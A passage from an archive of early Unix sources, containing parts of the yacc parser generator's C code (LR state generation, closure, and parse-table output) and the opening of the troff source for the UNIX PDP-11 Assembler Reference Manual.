  /* now, all explicitly empty nonterminals marked with pempty = 1 */

  /* loop as long as we keep finding nontrivial empty nonterminals */

again:
  for( i=1; i<nprod; ++i ){
    if( pempty[ *prdptr[i]-NTBASE ]==0 ){ /* not known to be empty */
      for( p=prdptr[i]+1; *p>=NTBASE && pempty[*p-NTBASE]!=0 ; ++p ) ;
      if( *p < 0 ){ /* we have a nontrivially empty nonterminal */
        pempty[*prdptr[i]-NTBASE] = 1;
        goto again; /* got one ... try for another */
        }
      }
    }
  }

int gsdebug 0;
stagen(){ /* generate the states */

  int i, j, k, c;

  /* initialize */

  nstate = 0;
  pstate[0] = pstate[1] = mem;
  aryfil( clset.lset, tbitset, 0 );
  putitem( prdptr[0]+1, &clset );
  tystate[0] = 1;
  nstate = 1;
  pstate[2] = pstate[1];

  memact = 0;
  aryfil( amem, actsiz, 0 );

  /* now, the main state generation loop */

  more:
  for( i=0; i<nstate; ++i ){
    if( tystate[i] != 1 ) continue;
    tystate[i] = 0;
    aryfil( temp1, nterms+nnonter+1, 0 );
    /* take state i, close it, and do gotos */
    closure(i);
    for( j=0; j<cwset; ++j ){ /* generate gotos */
      if( wsets[j].flag ) continue;
      wsets[j].flag = 1;
      c = *(wsets[j].pitem);
      if( c <= 1 ) {
		if( pstate[i+1]-pstate[i] <= j ) tystate[i] = (tystate[i]==1)?1:2;
		continue;
		}
      /* do a goto on c */
      for( k=j; k<cwset; ++k ){
        if( c == *(wsets[k].pitem) ){ /* this item contributes to the goto */
          putitem( wsets[k].pitem + 1, wsets[k].ws );
          wsets[k].flag = 1;
          }
        }
      if( c < NTBASE ) temp1[c] = state(c);
      else temp1[c-NTBASE+nterms] = state(c);
      }
    if( gsdebug ){
      settty();
      printf( "%d: ", i );
      for( j=1; j<=nterms; ++j ){
        if( temp1[j] != 0 ) printf( "%s %d, ", symnam(j), temp1[j]);
        }
      for( j=1; j<=nnonter; ++j ){
        if( temp1[j+nterms] ) printf( "%s %d, ", nontrst[j].name, temp1[j+nterms] );
        }
      printf("\n");
      }
    apstate[i] = apack( &temp1[0], nterms );
    indgo[i] = apack( &temp1[nterms+1], nnonter-1 ) - 1;
    goto more; /* we have done one goto; do some more */
    }
  /* no more to do... stop */
  }

int cldebug 0; /* debugging flag for closure */
closure(i){ /* generate the closure of state i */

  int c, ch, work;
  _REGISTER j, k;
  int *pi;
  int **s, **t;
  struct item *q;
  _REGISTER struct item *p;

  ++zzclose;

  /* first, copy kernel of state i to wsets */

  cwset = 0;
  q = pstate[i+1];
  for( p=pstate[i]; p<q; ++p ){
    wsets[cwset].pitem = p->pitem;
    wsets[cwset].flag = 1;    /* this item must get closed */
    for( k=0; k<tbitset; ++k ) wsets[cwset].ws[k] = p->look->lset[k];
    ++cwset;
    }

  /* now, go through the loop, closing each item */

  work = 1;
  while( work ){
    work = 0;
    for( j=0; j<cwset; ++j ){
  
      if( wsets[j].flag == 0 ) continue;
      c = *(wsets[j].pitem);  /* dot is before c */
  
      if( c < NTBASE ){
        wsets[j].flag = 0;
        continue;  /* only interesting case is where . is before nonterminal */
        }
  
      /* compute the lookahead */
      aryfil( clset.lset, tbitset, 0 );

      /* find items involving c */

      for( k=j; k<cwset; ++k ){
        if( wsets[k].flag == 1 && *(pi=wsets[k].pitem) == c ){
          wsets[k].flag = 0;
          if( nolook ) continue;
          while( (ch= *++pi)>0 ){
            if( ch < NTBASE ){ /* terminal symbol */
              clset.lset[ch>>4] =| (1<<(ch&017));
              break;
              }
            /* nonterminal symbol */
            union( clset.lset, clset.lset, pfirst[ch-NTBASE] );
            if( !pempty[ch-NTBASE] ) break;
            }
          if( ch<=0 ) union( clset.lset, clset.lset, wsets[k].ws );
          }
        }
  
      /*  now loop over productions derived from c */
  
      c =- NTBASE; /* c is now nonterminal number */
  
      t = pres[c+1];
      for( s=pres[c]; s<t; ++s ){
        /* put these items into the closure */
        for( k=0; k<cwset; ++k ){ /* is the item there */
          if( wsets[k].pitem == *s ){ /* yes, it is there */
            if( nolook ) goto nexts;
            if( union( wsets[k].ws, wsets[k].ws, clset.lset ) ) wsets[k].flag = work = 1;
            goto nexts;
            }
          }
  
        /*  not there; make a new entry */
        if( cwset+1 >= wssize ) error( "working set overflow" );
        wsets[cwset].pitem = *s;
        wsets[cwset].flag = 1;
        if( nolook ){
          cwset++;
          goto nexts;
          }
        work = 1;
        for( k=0; k<tbitset; ++k ) wsets[cwset].ws[k] = clset.lset[k];
        cwset++;
  
      nexts: ;
        }
  
      }
    }

  /* have computed closure; flags are reset; return */

  if( cwset > zzcwset ) zzcwset = cwset;
  if( !cldebug ) return;
  settty();
  printf("\nState %d, nolook = %d\n", i, nolook );
  for( j=0; j<cwset; ++j ){
    if( wsets[j].flag ) printf("flag set!\n");
    wsets[j].flag = 0;
    printf("\t%s", writem(&wsets[j].pitem));
    prlook( wsets[j].ws );
    printf( "\n" );
    }

  }

struct looksets *flset( p ) 
	struct looksets *p;
	{
	/* decide if the lookahead set pointed to by p is known */
	/* return pointer to a perminent location for the set */

	int j, *w;
	_REGISTER *u, *v, i;

	for( i=0; i<nlset; ++i ){
		u = p->lset;
		v = lkst[i].lset;
		w = & v[tbitset];
		while( v<w) if( *u++ != *v++ ) goto more;
		/* we have matched */
		return( & lkst[i] );
		more: ;
		}
	/* add a new one */
	if( nlset+1 >= lsetsz )error("too many lookahead sets");
	for( j=0; j<tbitset; ++j ){
		lkst[nlset].lset[j] = p->lset[j];
		}
	return( & lkst[nlset++]);
	}
-- /usr/source/yacc/source/y4.c mode=0110664 uid=3 gid=3 atime=174924689 mtime=169260992 --
# include "dextern"

output(){ /* print the output for the states */

  int i, j, k, c;

  settab();
  arrset("yyact");

  for( i=0; i<nstate; ++i ){ /* output the stuff for state i */
    nolook = (tystate[i]==0);
    closure(i);
    /* output actions */
    aryfil( temp1, nterms+1, 0 );
    for( j=0; j<cwset; ++j ){ /* look at the items */
      c = *( wsets[j].pitem );
      if( c>0 && c<NTBASE && temp1[c]==0 ) temp1[c] = go2(i,c);
      }

    if( i == 1 ) temp1[1] = ACCEPTCODE;

    /* now, we have the shifts; look at the reductions */

    lastred = 0;
    for( j=0; j<cwset; ++j ){
      c = *( wsets[j].pitem );
      if( c<=0 ){ /* reduction */
        lastred = -c;
        for( k=1; k<=nterms; ++k ){
          if( ((wsets[j].ws[k>>4])&(1<<(k&017))) != 0 ) {
            if( temp1[k] == 0 ) temp1[k] = c;
            else if( temp1[k]<0 ){ /* reduce/reduce conflict */
              settty();
              printf("\n%d: reduce/reduce conflict (red'ns %d and %d ) on %s",
                i, -temp1[k], lastred, symnam(k) );
              if( -temp1[k] > lastred ) temp1[k] = -lastred;
              ++zzrrconf;
              settab();
              }
            else { /* potential shift/reduce conflict */
              switch( precftn( lastred, k ) ) {

            case 0: /* precedence does not apply */

                settty();
                printf("\n%d: shift/reduce conflict (shift %d, red'n %d) on %s", i,
			temp1[k], lastred, symnam(k) );
                ++zzsrconf;
                settab();
                break;

            case 1: /*  reduce */

                temp1[k] = -lastred;
                break;

            case 2: /* error, binary operator */

                temp1[k] = ERRCODE;
                break;

            case 3: /* shift ... leave the entry alone */

                break;
                }
              }
            }
          }
        }
      }
    wract(i);
    }

  settab();
  arrdone();

  /* now, output the pointers to the action array */
  /* also output the info about reductions */
  prred();
  }

prred(){ /* print the information about the actions and the reductions */
  int index, i;

  arrset("yypact");
  index = 1;    /* position in the output table */

  for( i=0; i<nstate; ++i ){
    if( tystate[i]>0 ){  /* the state is real */
      temp1[i] = index;
      arrval( index );
      index =+ tystate[i];
      }
    else {
      arrval( temp1[-tystate[i]] );
      }
    }

  arrdone();

  arrset("yyr1");
  for( i=1; i<nprod; ++i ) arrval( *prdptr[i] - NTBASE );
  arrdone();

  arrset("yyr2");
  for( i=1; i<nprod; ++i ) arrval( ( prdptr[i+1]-prdptr[i]-2 ) );
  arrdone();

  }

go2(i,c){ /* do a goto on the closure state, not worrying about lookaheads */
  if( c<NTBASE ) return( amem[ apstate[i]+c ] );
  else return( amem[ apstate[i] + c - NTBASE + nterms ] );
  }

int pkdebug 0;
apack(p, n ) int *p;{ /* pack state i from temp1 into amem */
  _REGISTER k, l, off;
  int j;

  /* find the spot */

  j = n;
  for( off = 0; off <= j && p[off] == 0; ++off ) ;
  if( off > j ){ /* no actions */
    return(0);
    }
  j =- off;
  for( k=0; k<actsiz; ++k ){
    for( l=0; l<=j; ++l ){
      if( p[off+l] != 0 ){
        if( p[off+l] != amem[k+l] && amem[k+l] != 0 ) goto nextk;
        }
      }
    if( pkdebug ){ settty(); printf("off = %d, k = %d\n", off, k ); }
    /* we have found an acceptable k */
    for( l=0; l<=j; ++l ){
      if( p[off+l] ){
        if( k+l >= actsiz ) error("action table overflow");
        if( k+l >= memact ) memact = k+l;
        amem[k+l] = p[off+l];
        }
      }
    if( pkdebug ){
      for( k=0; k<memact; k=+10){
        printf("\t");
        for( l=0; l<=9; ++l ) printf("%d ", amem[k+l] );
        printf("\n");
        }
      }
    return(k-off);

    nextk: ;
    }
  error("no space in action table");
  }

go2out(){ /* output the gotos for the nontermninals */
  int i, j, k, best, offset, count, cbest, times;

  settab();
  arrset("yygo");
  offset = 1;

  for( i=1; i<=nnonter; ++i ) {
    go2gen(i);

    /* find the best one to make default */

    temp2[i] = offset;

    best = -1;
    times = 0;

    for( j=0; j<=nstate; ++j ){ /* is j the most frequent */
      if( tystate[j] == 0 ) continue;
      if( tystate[j] == best ) continue;

      /* is tystate[j] the most frequent */

      count = 0;
      cbest = tystate[j];

      for( k=j; k<=nstate; ++k ) if( tystate[k]==cbest ) ++count;

      if( count > times ){
        best = cbest;
        times = count;
        }
      }

    /* best is now the default entry */

    zzgobest =+ (times-1)*2;
    settab();
    for( j=0; j<=nstate; ++j ){
      if( tystate[j] != 0 && tystate[j]!=best ){
        arrval( j );
        arrval( tystate[j] );
        offset =+ 2;
        zzgoent =+ 2;
        }
      }

    /* now, the default */

    zzgoent =+ 2;
    arrval( -1 );
    arrval( best );
    offset =+ 2;

    }

  arrdone();

  arrset("yypgo");
  for( i=1; i<=nnonter; ++i ) arrval( temp2[i] );
  arrdone();

  }

int g2debug 0;
go2gen(c){ /* output the gotos for nonterminal c */

  int i, work, cc;
  struct item *p, *q;

  /* first, find nonterminals with gotos on c */

  aryfil( temp1, nnonter+1, 0 );
  temp1[c] = 1;

  work = 1;
  while( work ){
    work = 0;
    for( i=0; i<nprod; ++i ){
      if( (cc=prdptr[i][1]-NTBASE) >= 0 ){ /* cc is a nonterminal */
        if( temp1[cc] != 0 ){ /* cc has a goto on c */
          cc = *prdptr[i]-NTBASE; /* thus, the left side of production i does too */
          if( temp1[cc] == 0 ){
            work = 1;
            temp1[cc] = 1;
            }
          }
        }
      }
    }

  /* now, we have temp1[c] = 1 if a goto on c in closure of cc */

  if( g2debug ){
    settty();
    printf("%s: gotos on ", nontrst[c].name );
    for( i=0; i<=nnonter; ++i ) if( temp1[i]) printf("%s ", nontrst[i].name);
    printf("\n");
    }

  /* now, go through and put gotos into tystate */

  aryfil( tystate, nstate, 0 );
  settty();
  printf("\nnonterminal %s\n", nontrst[c].name );
  for( i=0; i<nstate; ++i ){
    q = pstate[i+1];
    for( p=pstate[i]; p<q; ++p ){
      if( (cc= *p->pitem) >= NTBASE ){
        if( temp1[cc =- NTBASE] ){ /* goto on c is possible */
          tystate[i] = amem[indgo[i]+c];
          break;
          }
        }
      }
    if( tystate[i] ) printf("\t%d\t%d\n", i, tystate[i]);
    }
  }

precftn(r,t){ /* decide a shift/reduce conflict by precedence.
			Returns 0 if action is 'do nothing',1 if action is reduce,
			2 if the action is 'error,binary operator'
			and 3 if the action is 'reduce'. */

	int lp,lt;
	lp = levprd[r];
	lt = trmlev[t];
	if ((lt==0)||((lp&03)==0))return(0);
	if((lt>>3) == (lp>>3)){
		return(lt&03);
		}
	if((lt>>3) > (lp>>3)) return(3);
	return(1);
	}

int cdebug 0; /* debug for common states */
wract(i){ /* output state i */
  /* temp1 has the actions, lastred the default */
  int p, p0, p1, size;
  int ntimes, tred, count, j;
  struct item *q0, *q1;

  /* find the best choice for lastred */

  lastred = 0;
  ntimes = 0;
  for( j=1; j<=nterms; ++j ){
    if( temp1[j] >= 0 ) continue;
    if( temp1[j]+lastred == 0 ) continue;
    /* count the number of appearances of temp1[j] */
    count = 0;
    tred = -temp1[j];
    for( p=1; p<=nterms; ++p ){
      if( temp1[p]+tred == 0 ) ++count;
      }
    if( count >ntimes ){
      lastred = tred;
      ntimes = count;
      }
    }

    /* clear out entries in temp1 which equal lastred */
    for( p=1; p<= nterms; ++p ) if( temp1[p]+lastred == 0 )temp1[p]=0;

    /* write out the state */

    /* first, check for equality with another state */
    /* see if there is a nonterminal with all dots before it. */

    p0 = 0;
    q1 = pstate[i+1];
    for( q0=pstate[i]; q0<q1; ++q0 ){
      if( (p1= *(q0->pitem) ) < NTBASE ) goto standard;
      if( p0 == 0 ) p0 = p1;
      else if( p0 != p1 ) goto standard;
      }

    /* now, all items have dots before p0 */
    if( cdebug ){
      settty();
      printf("state %d, pre-nonterminal %s\n",i,nontrst[p0-NTBASE].name);
      }

    for( j=0; j<i; ++j ){
      if( apstate[i] != apstate[j] ) continue;

      /* equal positions -- check items */

      if( cdebug )printf("states %d and %d have equal positions\n",i,j);
      q1 = pstate[j+1];
      for( q0=pstate[j]; q0<q1; ++q0 ){
        if( *(q0->pitem) != p0 ) goto nextj;
        }

      /* we have a match with state j ! */

      tystate[i] = -j;
      zzacsave =+ tystate[j];
      zznsave++;
      wrstate(i);
      return;

    nextj:  ;
      }


  standard:
    tystate[i] = 2;
    wrstate(i);

    size = 0;
    for( p0=1; p0<=nterms; ++p0 )
      if( (p1=temp1[p0])!=0 ) {
        arrval( TESTACT+trmset[p0].value );
        if( p1 < 0 ) arrval( REDUCACT - p1 );
        else if( p1 == ACCEPTCODE ) arrval( ACCEPTACT );
        else if( p1 == ERRCODE ) arrval( ERRACT );
        else arrval( SHIFTACT + p1 );
        size =+ 2;
        }
    if( lastred ) arrval( REDUCACT + lastred );
    else arrval( ERRACT );
    tystate[i] = size+1; /* store entry size in tystate */
    zzacent =+ (size+1);
    return;
  }

wrstate(i){ /* writes state i */
	int j0,j1,s;
        struct item *pp, *qq;
	settty();
	printf("\nstate %d\n",i);
	qq = pstate[i+1];
	for( pp=pstate[i]; pp<qq; ++pp) printf("\t%s\n", writem(pp));

        /* check for state equal to another */

        if( tystate[i] <= 0 ){
          printf("\n\tsame as %d\n\n", -tystate[i] );
          return;
          }

	for( j0=1; j0<=nterms; ++j0 ) if( (j1=temp1[j0]) != 0 ){
	printf("\n\t%s  ", symnam(j0) );
             if( j1>0 ){ /* shift, error, or accept */
               if( j1 == ACCEPTCODE ) printf( "accept" );
               else if( j1 == ERRCODE ) printf( "error" );
               else printf( "shift %d", j1 );
               }
		   else printf("reduce %d",-j1 );
	   }

	/* output the final production */

	if( lastred ) printf("\n\t.  reduce %d\n\n", lastred );
	else printf("\n\t.  error\n\n" );

ret:
	settab();
	}
-- /usr/source/yacc/source/y5.c mode=0100664 uid=3 gid=3 atime=174924709 mtime=169260992 --
/* fake portable I/O routines, for those
    sites so backward as to not have the
     port. library */

int cin, cout;
extern int fin, fout;

copen( s, c ) char *s; {
  int f;

  if( c == 'r' ){
    fin = f = open( s, 0 );
    }

  else if( c == 'a' ){
    f = open( s, 1 );
    seek( f, 0, 2 );
    }

  else {  /* c == w */
    f = creat( s, 0666 );
    }

  return( f );
  }

cflush(x){ /* fake! sets file to x */
  flush();
  fout = x;
  }

system(){
  error( "The function \"system\" is called" );
  }

cclose(i){
  close(i);
  }

cexit(i){
  flush();
  exit();
  }
-- /usr/doc mode=0140755 uid=3 gid=3 atime=174846453 mtime=173061210 --
-- /usr/doc/as mode=0140775 uid=3 gid=3 atime=173059602 mtime=173059506 --
-- /usr/doc/as/as mode=0110664 uid=3 gid=3 atime=170022658 mtime=173059591 --
.pl 11i
.hc %
.ll 6.5i
.ps 16
.vs 18p
.sp 1.5i
.ce
UNIX Assembler Reference Manual
.sp 1.5
.ft I
.ps 12
.ce
Dennis M. Ritchie
.ce 2
.sp .5
Bell Laboratories
Murray Hill, New Jersey
.sp 2
.ps 10
.vs 11p
.ft R
.de pg
.sp .5
..
.de et
.ft
.pg
..
.de ms
.ne 3
.sp
..
.de ul
.ne 4
.sp
.ft B
..
.de fo
'bp
..
.de he
'tl '-'''
'sp 0.5i
.ft I
.if o .tl '''Assembler Manual - %'
.if e .tl 'Assembler Manual - %'''
.ft
'sp 0.4i
.ns
..
.wh -1i fo
.wh 0 he
.ul
0.  Introduction
.et
This document describes the usage and input syntax
of the \s8UNIX PDP\s10-11 assembler \fIas\fP.  The details
of the \s8PDP\s10-11 are not described; consult the \s8DEC\s10 
documents ``\s8PDP\s10-11/20 Handbook'' and ``\s8PDP\s10-11/45 Handbook.''
.pg
The input syntax of the \s8UNIX\s10 assembler is generally
similar to that of the \s8DEC\s10 assembler \s8PAL\s10-11\s8R\s10, although
its internal workings and output format
are unrelated.
It may be useful to read the publication \s8DEC\s10-11-\s8ASDB\s10-\s8D\s10,
which describes \s8PAL\s10-11\s8R\s10, although naturally
one must use care in assuming that its rules apply
to \fIas\fP.
.pg
\fIAs\fP is a rather ordinary two-pass assembler without
macro capabilities.
It produces an output file which contains
relocation information and a complete
symbol table;
thus the output is acceptable to the \s8UNIX\s10 link-editor
\fIld\fP, which
may be used to combine the outputs of several
assembler runs and to obtain
object programs from libraries.
The output format has been designed
so that if a program contains no unresolved
ref%er%ences to external symbols, it is executable
without further processing.
.ul
1.  Usage
.et
\fIas\fP is used as follows:
.sp
.ft B
      as  \fR[\fB  _  \fR]  \fIfile\s6\d1\u\s10  .\|.\|.
.sp
.ft R
If the optional ``_'' argument is
given, all undefined symbols
in the current assembly will be made undefined-external.
See the \fB.globl\fR directive below.
.pg
The other arguments name files
which are concatenated and assembled.
Thus programs may be written in several
pieces and assembled together.
.pg
The output of the assembler is placed on
the file \fIa.out\fR in the current directory.
If there were no unresolved
external ref%er%ences, and no errors detected,
\fIa.out\fP is made executable; otherwise, if it is
produced at all, it is made non-executable.
.ul
2.  Lexical conventions
.et
Assembler tokens include identifiers (alternatively, ``symbols'' or ``names''),
temporary symbols,
constants, and operators.
.ms
2.1  Identifiers
.pg
An identifier consists of a sequence of alphanumeric characters (including
period ``\|\fB.\fR\|'', underscore ``\(ul'',
and tilde ``~''
as alphanumeric)
of which the first may not
be numeric.
Only the first eight characters are significant.
When a name begins with a tilde, the tilde is discarded
and that occurrence of the identifier generates
a unique entry in the symbol table which can match
no other occurrence of the identifier.
This feature is used
by the C compiler to place names of local variables
in the output symbol table
without having to worry
about 
making them unique.
.ms
2.2  Temporary symbols
.pg
A temporary symbol consists of a digit followed by ``f\|'' or
``b''.
Temporary symbols are discussed fully in \(sc5.1.
.ms
2.3  Constants
.pg
An octal constant consists of a sequence of digits; ``8'' and
``9'' are taken to have octal value 10 and 11.
The constant
is truncated to 16 bits and interpreted in two's complement
notation.
.pg
A decimal constant consists of a sequence of digits terminated
by a decimal point ``\fB.\fR''.  The magnitude of the constant should be
representable in 15 bits; i.e., be less than 32,768.
.pg
A single-character constant consists of a single quote ``\|\(fm\|''
followed by an \s8ASCII\s10 character not a new-line.
Certain dual-character escape sequences
are acceptable in place of the \s8ASCII\s10 character to represent
new-line and other non-graphics (see \fIString state%ments\fP, \(sc5.5).
The constant's value has the code for the
given character in the least significant
byte of the word and is null-padded on the left.
.pg
A double-character constant consists of a double
quote ``\|"\|'' followed by a pair of \s8ASCII\s10 characters
not including new-line.
Certain dual-character escape sequences are acceptable
in place of either of the \s8ASCII\s10 characters
to represent new-line and other non-graphics
(see \fIString state%ments\fR, \(sc5.5).
The constant's value has the code for the first
given character in the least significant
byte and that for the second character in
the most significant byte.
.ms
2.4  Operators
.pg
There are several single- and double-character
operators; see \(sc6.
.ms
2.5  Blanks
.pg
Blank and tab characters
may be interspersed freely between tokens, but may
not be used within tokens (except character constants).
A blank or tab is required to separate adjacent
identifiers or constants not otherwise separated.
.ms
2.6  Comments
.pg
The character ``\|/\|'' introduces a comment, which extends
through the end of the line on which it appears.
Comments are ignored by the assembler.
.ul
3.  Segments
.et
Assembled code and data
fall into three segments: the text segment, the data segment, and the bss segment.
The text segment is the one in which the assembler begins,
and it is the one into which instructions are typically placed.
The \s8UNIX\s10 system will, if desired,
enforce the purity of the text segment of programs by
trapping write operations
into it.
Object programs produced by the assembler must be processed
by the link-editor \fIld\fR
(using its ``_n'' flag)
if the text segment is to be write-protected.
A single copy of the text
segment is shared among all processes
executing such a program.
.pg
The data segment is available for placing
data or instructions which
will be modified during execution.
Anything which may go in the text segment may be put
into the data segment.
In programs with write-protected, sharable text segments,
data segment contains the initialized but variable
parts of a program.
If the text segment is not pure, the data segment begins
immediately after the
text segment;
if the text segment is pure, the data segment begins at the lowest
8K byte boundary after the text segment.
.pg
The bss segment may not contain any explicitly initialized code
or data.
The length of the bss segment (like that of text or data)
is determined by the high-water mark of the location counter
within it.
The bss segment is actually an extension of
the data segment and begins immediately after it.
At the start of execution of a program, the bss segment
is set to 0.
Typically the bss segment is set up
by state%ments exemplified by
.sp
	lab\fB: .\fR = \fB.\fR+10
.sp
The advantage in using the bss segment
for storage that starts off empty is that the initialization
information need not be stored in the output file.
See also \fILocation counter\fP and \fIAssignment state%ments\fP
below.
.ul
4.  The location counter
.et
One special symbol, ``\|\fB.\fP\|'', is the location counter.
Its value at any time is the offset
within the appropriate segment of the start of
the state%ment in which it appears.
The location counter may be assigned to,
with the restriction that the
current segment may not change;
furthermore,
the value of ``\|\fB.\fP\|'' may not decrease.
If the effect of the assignment is to increase the value of ``\|\fB.\fP\|'',
the required number of null bytes are generated
(but see \fISegments\fP above).
.ul
5.  Statements
.et
A source program is composed of a sequence of
\fIstate%ments\fP.
Statements are separated either by new-lines
or by semicolons.
There are five kinds of state%ments: null state%ments,
expression state%ments, assignment state%ments,
string state%ments,
and keyword state%ments.
.pg
Any kind of state%ment may be preceded by
one or more labels.
.ms
5.1  Labels
.pg
There are two kinds of label:
name labels and numeric labels.
A name label consists of a name followed
by a colon (\|:\|).
The effect of a name label is to assign the current
value and type of the location counter ``\|\fB.\fP\|''
to the name.
An error is indicated in pass 1 if the
name is already defined;
an error is indicated in pass 2 if the ``\|\fB.\fP\|''
value assigned changes the definition
of the label.
.pg
A numeric label consists of a digit \fI0\fR to \fI9\fR followed by a colon (\|:\|).
Such a label serves to define temporary
symbols of the form ``\fIn\fR\|b'' and ``\fIn\fR\|f\|'', where \fIn\fR is
the digit of the label.
As in the case of name labels, a numeric label assigns
the current value and type of ``\|\fB.\fP\|'' to the temporary
symbol.
However, several numeric labels with the same
digit may be used within the same assembly.
Ref%er%ences of the form ``\fIn\fR\|f\|'' refer to the first
numeric label ``\fIn\|\fR:'' \fIf\fR\|orward from the ref%er%ence;
``\fIn\fRb'' symbols refer to the first ``\fIn\fR\|:'' label
\fIb\fRackward from the ref%er%ence.
This sort of temporary label was introduced by Knuth
[\fIThe Art of Computer Programming, Vol I: Fundamental Algorithms\|\fR].
Such labels tend to conserve both the symbol table
space of the assembler and the
inventive powers of the programmer.
.ms
5.2  Null state%ments
.pg
A null state%ment is an empty state%ment (which may, however,
have labels).
A null state%ment is ignored by the assembler.
Common examples of null state%ments are empty
lines or lines containing only a label.
.ms
5.3  Expression state%ments
.pg
An expression state%ment consists of an arithmetic
expression not beginning with
a keyword.
The assembler computes its (16-bit) value
and places it in the output stream, together with the
appropriate relocation bits.
.ms
5.4  Assignment state%ments
.pg
An assignment state%ment consists of an identifier, an equals sign (\|=\|),
and an expression.
The value and type of the expression are assigned to
the identifier.
It is not required that the type or value be
the same in pass 2 as in pass 1, nor is it an
error to redefine any symbol by assignment.
.pg
Any external attribute of the expression is lost across
an assignment.
This means that it is not possible to declare a global
symbol by assigning to it, and that it is impossible
to define a symbol to be offset from a non-locally
defined global symbol.
.pg
As mentioned,
it is permissible to assign to the
location counter ``\|\fB.\fP\|''.
It is required, however, that the type of
the expression assigned be of the same type
as ``\|\fB.\fP\|'',
and it is forbidden to decrease the value
of ``\fB\|.\|\fR''.
In practice, the most common assignment to ``\|\fB.\fP\|'' has the form
``.\|=\|.\|+\|\fIn\fR''
for some number \fIn;\fR this has the effect of generating
\fIn\fR null bytes.
.ms
5.5  String state%ments
.pg
A string state%ment generates a sequence of bytes containing \s8ASCII\s10 characters.
A string state%ment consists of a left string quote ``<''
followed by a sequence of \s8ASCII\s10 characters not including newline,
followed by a right string quote ``>''.
Any of the \s8ASCII\s10 characters may
be replaced by a two-character escape sequence to represent
certain non-graphic characters, as follows:
.sp
.ta .5i 1.5i 2.0i
.ne 9
.nf
	\\n	\s8NL\s10	(012)
	\\t	\s8HT\s10	(011)
	\\e	\s8EOT\s10	(004)
	\\0	\s8NUL\s10	(000)
	\\r	\s8CR\s10	(015)
	\\a	\s8ACK\s10	(006)
	\\p	\s8PFX\s10	(033)
	\\\\	\\
	\\>	>
.sp
.fi
.in 0
The last two are included so that the escape character
and the right string quote may be represented.
The same escape sequences
may also be used within single- and double-character
constants (see \(sc2.3 above).
.ms
5.6  Keyword state%ments
.pg
Keyword state%ments are numerically the most common type,
since most machine instructions are of this
sort.
A keyword state%ment begins with one of the many predefined
keywords of the assembler;
the syntax of the remainder depends
on the keyword.
All the keywords are listed below with the syntax they require.
.ul
6.  Expressions
.et
An expression is a sequence of symbols representing a value.
Its constituents are identifiers, constants, temporary symbols,
operators, and brackets.
Each expression has a type.
.pg
All operators in expressions are fundamentally binary in
nature; if an operand is missing on the left, a 0
of absolute type is assumed.
Arithmetic
is two's complement and has 16 bits of precision.
All operators have equal precedence, and expressions
are evaluated
strictly left to right except for the effect
of brackets.
.ms
6.1  Expression operators
.pg
The operators are:
.sp
.in 8
.ta 3 8
.ti 0
	(blank)	when there is no operator between
operands, the effect is
exactly the same as if a ``+'' had appeared.
.pg
.ti 0
	+	addition
.pg
.ti 0
	_	subtraction
.pg
.ti 0
	*	multiplication
.pg
.ti 0
	\\\(sl	division (note that plain ``\|/\|'' starts a comment)
.pg
.ti 0
	&	bitwise \fBand\fR
.pg
.ti 0
	\|\|\(bv	bitwise \fBor\fR
.pg
.ti 0
	>>	logical right shift
.pg
.ti 0
	<<	logical left shift
.pg
.hc
.ti 0
	%	modulo
.pg
.hc %
.ti 0
	!	\fIa\fR\|!\|\fIb\fR is \fIa \fBor \fR(\|\fBnot \fIb\fR\|);
i.e., the \fBor\fR of the first operand and
the one's complement of the second; most common use is
as a unary.
.pg
.ti 0
	^	result has the value of first operand and the type of the second;
most often used to define new machine instructions
with syntax identical to existing instructions.
.sp
.in 0
Expressions may be grouped by use of square brackets ``\|[\|\|]\|''.
(Round parentheses are reserved for address modes.)
.ms
6.2  Types
.pg
The assembler deals with a number of types
of expressions.  Most types
are attached to keywords and used to select the
routine which treats that keyword.  The types likely
to be met explicitly are:
.sp 1
.in 6
.ti 3
undefined
.br
Upon first encounter, each symbol is undefined.
It may become undefined if it is assigned an undefined expression.
It is an error to attempt to assemble an undefined
expression in pass 2; in pass 1, it is not (except that
certain keywords require operands which are not undefined).
.pg
.ti 3
undefined external
.br
A symbol which is declared \fB.globl\fR but not defined
in the current assembly is an undefined
external.
If such a symbol is declared, the link editor \fIld\fR
must be used to load the assembler's output with
another routine that defines the undefined ref%er%ence.
.pg
.ti 3
absolute
.br
An absolute symbol is one defined ultimately from a constant.
Its value is unaffected by any possible future applications
of the link-editor to the output file.
.pg
.ti 3
text
.br
The value of a text symbol is measured
with respect to the beginning of the text segment of the program.
If the assembler output is link-edited, its text
symbols may change in value
since the program need
not be the first in the link editor's output.
Most text symbols are defined by appearing as labels.
At the start of an assembly, the value of ``\|\fB.\fP\|'' is text 0.
.pg
.ti 3
data
.br
The value of a data symbol is measured
with respect to the origin of the data segment of a program.
Like text symbols, the value of a data symbol may change
during a subsequent link-editor run since previously
loaded programs may have data segments.
After the first \fB.data\fR state%ment, the value of ``\|\fB.\fP\|''
is data 0.
.pg
.ti 3
bss
.br
The value of a bss symbol is measured from
the beginning of the bss segment of a program.
Like text and data symbols, the value of a bss symbol
may change during a subsequent link-editor
run, since previously loaded programs may have bss segments.
After the first \fB.bss\fR state%ment, the value of ``\|\fB.\fP\|'' is bss 0.
.pg
.ti 3
external absolute, text, data, or bss
.br
symbols declared \fB.globl\fR
but defined within an assembly as absolute, text, data, or bss
symbols may be used exactly as if they were not
declared \fB.globl\fR; however, their value and type are available
to the link editor so that the program may be loaded with others
that ref%er%ence these symbols.
.pg
.ti 3
register
.br
The symbols
.ta 6
.pg
.nf
	\fBr0\fR  .\|.\|. \fBr5
	fr0\fR  .\|.\|. \fBfr5
	sp
	pc
.ft R
.fi
.pg
are predefined
as register symbols.
Either they or symbols defined from them must
be used to refer to the six general-purpose,
six floating-point, and
the 2 special-purpose machine registers.
The behavior of the floating register names
is identical to that of the corresponding
general register names; the former
are provided as a mnemonic aid.
.pg
.ti 3
other types
.br
Each keyword known to the assembler has a type which
is used to select the routine which processes
the associated keyword state%ment.
The behavior of such symbols
when not used as keywords is the same as if they were absolute.
.in 0
.ms
6.3  Type propagation in expressions
.pg
When operands are combined by expression operators,
the result has a type which depends on the types
of the operands and on the operator.
The rules involved are complex to state but
were intended to be sensible and predictable.
For purposes of expression evaluation the
important types are
.pg
.ta 1i
.nf
	undefined
	absolute
	text
	data
	bss
	undefined external
	other
.fi
.pg
The combination rules are then:
If one of the operands
is undefined, the result is undefined.
If both operands are absolute, the result is absolute.
If an absolute is combined with one of the ``other types''
mentioned above,
or with a register expression, the result
has the register or other type.
As a consequence,
one can refer to r3 as ``r0+3''.
If two operands of ``other type'' are combined,
the result has the
